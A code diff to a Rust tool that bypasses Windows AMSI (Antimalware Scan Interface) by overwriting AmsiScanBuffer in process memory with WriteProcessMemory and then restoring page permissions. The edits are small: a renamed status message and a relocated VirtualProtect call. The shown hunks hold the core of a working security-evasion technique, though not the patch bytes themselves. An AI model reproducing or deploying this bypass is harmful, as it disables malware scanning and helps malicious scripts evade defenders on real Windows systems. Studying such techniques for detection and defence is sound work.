@@ -24,7 +24,7 @@ use winapi::{
 };
 
 fn main() {
-    println!("[+] Patching 4ms1 for current process...");
+    println!("[+] Patching amsi for current process...");
 
     unsafe {
         // Getting the address of AmsiScanBuffer.
@@ -42,9 +42,9 @@ fn main() {
         if WriteProcessMemory(GetCurrentProcess(), amsi_scan_addr.cast(), patch.as_ptr().cast(), 6, written) == FALSE {
             panic!("[-] Failed to overwrite function.");
         }
-        VirtualProtect(amsi_scan_addr.cast(), 6, old_permissions, &mut old_permissions);
 
-        // Spawn the new powershell.
+        // Restoring the permissions.
+        VirtualProtect(amsi_scan_addr.cast(), 6, old_permissions, &mut old_permissions);
         println!("[+] AmsiScanBuffer patched!");
     }
 }
